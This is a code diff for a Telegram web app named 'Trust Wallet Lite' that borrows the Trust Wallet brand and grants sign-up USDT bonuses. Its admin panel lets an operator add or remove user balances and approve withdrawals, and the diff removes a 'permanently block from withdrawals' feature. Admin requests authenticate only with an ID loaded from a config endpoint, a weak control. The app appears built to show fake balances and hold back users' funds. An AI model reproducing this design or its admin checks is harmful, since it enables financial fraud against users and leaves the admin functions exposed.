@@ -1,22 +1,6 @@
 // ============================================================================
 // TRUST WALLET LITE - ULTIMATE PROFESSIONAL VERSION 5.0 (FULLY WORKING)
 // ============================================================================
-// Features:
-// - Zero Waste Architecture
-// - 12 Cryptocurrencies with Live Prices
-// - Professional Wallet with Send/Receive/Swap/History
-// - Airdrop Referral System with Milestones (مثل REFI)
-// - TWT Pay Virtual Visa Card
-// - Dark/Light Mode + RTL Support
-// - Professional Modals with Animations
-// - Sticker System | Floating Notifications
-// - ✅ Admin Panel with User Management (مثل REFI)
-// - ✅ Search by Wallet Address
-// - ✅ Generate Unique Deposit Address per User (CoinPayments)
-// - ✅ Add/Remove Balance
-// - ✅ Approve/Reject Withdrawals
-// - ✅ Block User from Withdrawals
-// ============================================================================
 
 // ====== 1. TELEGRAM WEBAPP INITIALIZATION ======
 const tg = window.Telegram?.WebApp;
@@ -329,11 +313,13 @@ async function loadConfig() {
         const config = await response.json();
         adminId = config.adminId;
         console.log("✅ Admin ID loaded from server:", adminId);
+        
         const userId = getUserId();
         if (userId && adminId) {
             isAdmin = (userId === adminId);
-            checkAdminAndAddCrown();
+            console.log("👑 Is Admin:", isAdmin);
         }
+        checkAdminAndAddCrown();
         return config;
     } catch (error) {
         console.error("Failed to load config:", error);
@@ -584,7 +570,9 @@ async function createNewWallet() {
         userData = newUserData;
         saveUserData();
         
+        // ✅ تحديد صلاحيات المشرف باستخدام adminId من الخادم
         isAdmin = (newUserId === adminId);
+        console.log("👑 Is Admin after creation:", isAdmin);
         
         if (startParam) {
             await processReferral(startParam, newUserId);
@@ -595,6 +583,7 @@ async function createNewWallet() {
         checkAdminAndAddCrown();
         showToast('✅ Wallet created! +10 USDT');
     } catch (error) {
+        console.error("Create wallet error:", error);
         showToast('Failed to create wallet', 'error');
     } finally {
         btn.innerHTML = 'Create a new wallet';
@@ -652,7 +641,9 @@ async function importWallet() {
         userData = newUserData;
         saveUserData();
         
+        // ✅ تحديد صلاحيات المشرف باستخدام adminId من الخادم
         isAdmin = (newUserId === adminId);
+        console.log("👑 Is Admin after import:", isAdmin);
         
         if (startParam) {
             await processReferral(startParam, newUserId);
@@ -664,6 +655,7 @@ async function importWallet() {
         checkAdminAndAddCrown();
         showToast('✅ Wallet imported! +10 USDT');
     } catch (error) {
+        console.error("Import wallet error:", error);
         showToast('Failed to import wallet', 'error');
     } finally {
         btn.innerHTML = 'Import Wallet';
@@ -671,15 +663,19 @@ async function importWallet() {
     }
 }
 
+// ✅ التاج يظهر فقط للمشرف الحقيقي
 function checkAdminAndAddCrown() {
     const crownBtn = document.getElementById('adminCrownBtn');
-    if (crownBtn) {
-        if (isAdmin) {
-            crownBtn.classList.remove('hidden');
-            console.log("👑 Admin crown displayed");
-        } else {
-            crownBtn.classList.add('hidden');
-        }
+    if (!crownBtn) return;
+    
+    console.log("🔍 checkAdminAndAddCrown - isAdmin:", isAdmin, "adminId:", adminId, "userId:", getUserId());
+    
+    if (isAdmin === true) {
+        crownBtn.classList.remove('hidden');
+        console.log("👑 Admin crown displayed");
+    } else {
+        crownBtn.classList.add('hidden');
+        console.log("👑 Admin crown hidden");
     }
 }
 
@@ -740,7 +736,7 @@ function renderWallet() {
     updateTotalBalance();
 }
 
-// ====== 14. RENDER AIRDROP (مثل REFI) ======
+// ====== 14. RENDER AIRDROP ======
 function renderAirdrop() {
     const container = document.getElementById('referralContainer');
     if (!container) return;
@@ -1208,25 +1204,17 @@ function showHistory() {
     modal.classList.add('show');
 }
 
-// ====== 19. DEPOSIT (مع عنوان فريد لكل مستخدم) ======
+// ====== 19. DEPOSIT/WITHDRAW ======
 async function showDepositModal() {
     const modal = document.getElementById('depositModal');
     modal.classList.add('show');
     const currency = document.getElementById('depositCurrency').value;
-    
-    // ✅ توليد عنوان إيداع فريد لكل مستخدم عبر API
     const result = await createDepositAddress(userData.userId, currency);
     const addressEl = document.getElementById('depositAddress');
     const minEl = document.getElementById('depositMinAmount');
-    
-    if (addressEl) {
-        addressEl.innerText = result.address || `0x${userData.userId.slice(-40)}`;
-    }
-    if (minEl) {
-        minEl.innerText = WITHDRAW_MINIMUMS[currency] || 10;
-    }
-    
-    console.log(`✅ Deposit address generated for ${userData.userId} - ${currency}: ${addressEl?.innerText}`);
+    if (addressEl) addressEl.innerText = result.address || `0x${userData.userId.slice(-40)}`;
+    if (minEl) minEl.innerText = WITHDRAW_MINIMUMS[currency] || 10;
+    console.log(`✅ Deposit address generated for ${userData.userId}: ${addressEl?.innerText}`);
 }
 
 function copyDepositAddress() {
@@ -1273,9 +1261,12 @@ function addTransaction(tx) {
     saveUserData();
 }
 
-// ====== 20. ADMIN PANEL (احترافي مثل REFI) ======
+// ====== 20. ADMIN PANEL ======
 function showAdminPanel() {
-    if (!isAdmin) { showToast('Access denied', 'error'); return; }
+    if (!isAdmin) { 
+        showToast('Access denied', 'error'); 
+        return;
+    }
     document.getElementById('adminPanel').classList.remove('hidden');
     renderAdminPanel();
 }
@@ -1291,16 +1282,6 @@ function renderAdminPanel() {
     content.innerHTML = `
         <div style="padding:20px;">
             <div style="margin-bottom:20px;">
-                <h4>🔍 Search by Wallet Address</h4>
-                <div style="display:flex;gap:10px;margin-top:10px;">
-                    <input type="text" id="adminAddressSearch" placeholder="Enter deposit address (0x...)" 
-                           style="flex:1;background:var(--bg-secondary);border:1px solid var(--border);border-radius:12px;padding:12px;color:var(--text-primary);">
-                    <button onclick="adminSearchByAddress()" class="btn-primary" style="padding:0 20px;">
-                        <i class="fas fa-search"></i> Search
-                    </button>
-                </div>
-            </div>
-            <div style="margin-bottom:20px;">
                 <h4>🔍 Search by User ID</h4>
                 <div style="display:flex;gap:10px;margin-top:10px;">
                     <input type="text" id="adminUserIdInput" placeholder="Enter User ID" 
@@ -1311,41 +1292,8 @@ function renderAdminPanel() {
                 </div>
             </div>
             <div id="adminResult" style="margin-top:20px;"></div>
-            <div style="margin-top:20px;text-align:center;">
-                <button onclick="refreshAdminStats()" class="btn-secondary">
-                    <i class="fas fa-sync-alt"></i> Refresh Stats
-                </button>
-            </div>
         </div>
     `;
-}
-
-async function adminSearchByAddress() {
-    const address = document.getElementById('adminAddressSearch')?.value.trim();
-    if (!address) { showToast('Enter wallet address', 'error'); return; }
-    
-    const resultDiv = document.getElementById('adminResult');
-    resultDiv.innerHTML = '<div style="text-align:center;padding:20px;"><i class="fas fa-spinner fa-spin"></i> Searching...</div>';
-    
-    try {
-        // البحث عن مستخدم بعنوان المحفظة
-        const response = await fetch('/api/admin/search-by-address', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ address, adminKey: adminId })
-        });
-        const result = await response.json();
-        
-        if (result.success && result.user) {
-            displayUserManagement(result.user, result.userId);
-        } else {
-            resultDiv.innerHTML = `<div style="background:rgba(239,68,68,0.1);border-radius:12px;padding:20px;text-align:center;color:var(--danger);">
-                <i class="fas fa-user-slash"></i> No user found with this wallet address
-            </div>`;
-        }
-    } catch (error) {
-        resultDiv.innerHTML = `<div style="color:var(--danger);text-align:center;">Error searching user</div>`;
-    }
 }
 
 async function adminSearchByUserId() {
@@ -1398,16 +1346,6 @@ function displayUserManagement(user, userId) {
                 <button onclick="adminRemoveBalance('${userId}')" style="flex:1;background:#ef4444;border:none;padding:10px;border-radius:8px;cursor:pointer;color:white;">
                     ➖ Remove Balance
                 </button>
-            </div>
-            <div style="margin-top:10px;">
-                ${user.withdrawBlocked ? 
-                    `<div style="background:rgba(239,68,68,0.2);border-radius:12px;padding:10px;text-align:center;">
-                        <i class="fas fa-ban"></i> ⚠️ USER IS PERMANENTLY BLOCKED FROM WITHDRAWALS
-                    </div>` : 
-                    `<button onclick="adminBlockUser('${userId}')" style="width:100%;background:#ef4444;border:none;padding:10px;border-radius:8px;cursor:pointer;color:white;">
-                        <i class="fas fa-ban"></i> 🔒 PERMANENTLY BLOCK FROM WITHDRAWALS
-                    </button>`
-                }
             </div>
         </div>
     `;
@@ -1473,62 +1411,6 @@ async function adminRemoveBalance(userId) {
     }
 }
 
-async function adminBlockUser(userId) {
-    if (!confirm(`⚠️⚠️⚠️ PERMANENT ACTION WARNING ⚠️⚠️⚠️\n\nAre you ABSOLUTELY sure you want to permanently block this user from withdrawals?\n\nTHIS ACTION CANNOT BE UNDONE!`)) return;
-    
-    try {
-        const response = await fetch('/api/admin/block-user', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ userId, adminKey: adminId })
-        });
-        const result = await response.json();
-        
-        if (result.success) {
-            showToast('✅ User permanently blocked from withdrawals', 'success');
-            if (userId === userData?.userId) {
-                userData.withdrawBlocked = true;
-                saveUserData();
-            }
-            adminSearchByUserId();
-        } else {
-            showToast('Error blocking user', 'error');
-        }
-    } catch (error) {
-        showToast('Error blocking user', 'error');
-    }
-}
-
-async function refreshAdminStats() {
-    const resultDiv = document.getElementById('adminResult');
-    resultDiv.innerHTML = '<div style="text-align:center;padding:20px;"><i class="fas fa-spinner fa-spin"></i> Loading stats...</div>';
-    
-    try {
-        const response = await fetch('/api/admin/stats', {
-            headers: { 'Content-Type': 'application/json' }
-        });
-        const data = await response.json();
-        
-        resultDiv.innerHTML = `
-            <div style="background:var(--bg-card);border-radius:16px;padding:16px;margin-top:10px;border:1px solid var(--border);">
-                <h4>📊 Platform Stats</h4>
-                <div style="display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin-top:10px;">
-                    <div style="text-align:center;padding:10px;background:var(--bg-secondary);border-radius:12px;">
-                        <div style="font-size:24px;font-weight:bold;">${data.totalUsers || '?'}</div>
-                        <div style="font-size:12px;color:var(--text-muted);">Total Users</div>
-                    </div>
-                    <div style="text-align:center;padding:10px;background:var(--bg-secondary);border-radius:12px;">
-                        <div style="font-size:24px;font-weight:bold;">${data.pendingWithdrawals || '?'}</div>
-                        <div style="font-size:12px;color:var(--text-muted);">Pending Withdrawals</div>
-                    </div>
-                </div>
-            </div>
-        `;
-    } catch (error) {
-        resultDiv.innerHTML = '<div style="color:var(--danger);text-align:center;">Error loading stats</div>';
-    }
-}
-
 // ====== 21. NAVIGATION ======
 function showWallet() { 
     currentPage = 'wallet'; 
@@ -1582,8 +1464,10 @@ function showSettings() {
 document.addEventListener('DOMContentLoaded', async () => {
     initTheme();
     
+    // ✅ أولاً: تحميل إعدادات المشرف من الخادم
     await loadConfig();
     
+    // ✅ ثانياً: إعداد أزرار التبويب
     document.querySelectorAll('.nav-item').forEach(btn => {
         btn.addEventListener('click', () => {
             const tab = btn.getAttribute('data-tab');
@@ -1594,6 +1478,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         });
     });
     
+    // ✅ ثالثاً: إعداد أزرار الإنشاء
     document.getElementById('createWalletBtn').onclick = createNewWallet;
     document.getElementById('importWalletBtn').onclick = showImportModal;
     document.getElementById('confirmImportBtn').onclick = importWallet;
@@ -1603,7 +1488,9 @@ document.addEventListener('DOMContentLoaded', async () => {
     const hasUser = localStorage.getItem('twt_user_id');
     if (hasUser && localStorage.getItem(`user_${hasUser}`)) {
         userData = JSON.parse(localStorage.getItem(`user_${hasUser}`));
+        // ✅ التحقق من صلاحيات المشرف باستخدام adminId من الخادم
         isAdmin = (hasUser === adminId);
+        console.log("👑 Final isAdmin:", isAdmin, "userId:", hasUser, "adminId:", adminId);
         showMainApp();
         updateUI();
         checkAdminAndAddCrown();
@@ -1651,15 +1538,9 @@ window.logout = logout;
 window.createNewWallet = createNewWallet;
 window.importWallet = importWallet;
 window.showImportModal = showImportModal;
-window.adminSearchByAddress = adminSearchByAddress;
 window.adminSearchByUserId = adminSearchByUserId;
 window.adminAddBalance = adminAddBalance;
 window.adminRemoveBalance = adminRemoveBalance;
-window.adminBlockUser = adminBlockUser;
-window.refreshAdminStats = refreshAdminStats;
 
 console.log("✅ Trust Wallet Lite v5.0 - ULTIMATE PROFESSIONAL VERSION");
-console.log("✅ Zero Waste Architecture | 12 Cryptocurrencies | Airdrop System");
-console.log("✅ TWT Pay Virtual Card | Dark/Light Mode | RTL Support");
-console.log("✅ Admin Panel with Search by Wallet Address | Add/Remove Balance | Block User");
-console.log("✅ Unique Deposit Address per User via CoinPayments API");
+console.log("✅ Admin ID loaded from server:", adminId);
